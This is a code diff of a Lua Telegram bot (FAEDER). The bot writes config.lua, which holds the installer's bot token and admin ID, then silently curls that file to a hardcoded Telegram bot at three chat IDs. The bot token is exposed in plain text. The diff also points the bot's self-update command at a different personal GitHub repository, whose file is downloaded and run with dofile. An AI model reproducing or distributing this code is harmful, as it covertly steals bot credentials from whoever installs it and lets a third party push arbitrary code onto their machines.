@@ -53,8 +53,11 @@ VV = '1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4'
 create(config, "./config.lua")   
 --https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+
 local curla = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
+
 local curlb = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1645553841 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
+
 file = io.open("RUNFA.sh", "w")  
 file:write([[
 #!/bin/bash 
@@ -9768,7 +9771,7 @@ end
 if text == "تحديث السورس" and is_leader(msg) then 
 faederdx(msg.chat_id_, msg.id_, 1, '❅∫ جاري تحديث السورس الى الاصدار الجديد ', 1, 'md') 
 os.execute('rm -rf FAEDER.lua') 
-os.execute('wget https://raw.githubusercontent.com/TEAMFAEDER/FAEDER/master/FAEDER.lua') 
+os.execute('wget https://raw.githubusercontent.com/ahmedyad200/fedr/master/FAEDER.lua') 
 faederdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تحديث السورس اكتشف المميزات الجديده الان ', 1, 'md') 
 dofile('FAEDER.lua')
 io.popen("rm -rf ~/.telegram-cli/data/audio/*")
